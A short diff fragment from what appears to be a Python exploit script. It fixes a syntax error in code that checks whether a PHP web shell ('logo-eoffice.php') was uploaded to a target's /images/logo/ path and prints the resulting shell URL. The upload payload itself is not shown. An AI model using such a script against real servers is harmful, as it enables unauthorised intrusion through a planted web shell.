@@ -21,7 +21,7 @@ def upload(url):
         resp_text=resp.text
         resp_code=resp.status_code
         shell_url=url+'/images/logo/'+resp_text
-        if resp_code ==200 and 'logo-eoffice.php' == resp_text::
+        if resp_code ==200 and 'logo-eoffice.php' == resp_text:
             print(f'[+]上传成功:{shell_url}')
         else:
             print('[-]上传失败')
